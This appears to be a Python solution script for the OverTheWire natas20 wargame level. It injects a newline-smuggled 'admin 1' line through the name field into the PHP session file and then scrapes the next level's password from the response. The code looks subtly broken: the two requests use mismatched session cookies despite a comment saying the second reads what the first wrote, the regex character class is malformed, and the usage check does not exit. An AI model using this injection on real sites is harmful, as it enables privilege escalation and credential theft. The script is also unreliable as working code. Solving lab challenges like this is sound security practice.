import sys
import requests
import re

def bruteforce_user_password():

    url = "http://natas20.natas.labs.overthewire.org"

    auth=("natas20",sys.argv[1])
    
    # Sending the request twice, once to write to the session file
    response = requests.post(
        url + "/index.php?debug", 
        auth=auth,
        data={
            "name": "temp\nadmin 1",
        },
        cookies={
            "PHPSESSID": "2"
        })
    
    # The second request is to read from the file and set the session variable
    response = requests.post(
        url + "/index.php?debug", 
        auth=auth,
        data={
            "name": "temp\nadmin 1"
        },
        cookies={
            "PHPSESSID": "1"
        })

    if "login as an admin" not in response.text.lower():

        print(response.request.body)

        pattern = re.compile(r"Password: [a-zA-z0-9]{32}")
        match = pattern.search(response.text)

        if match:
            print(match.group())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
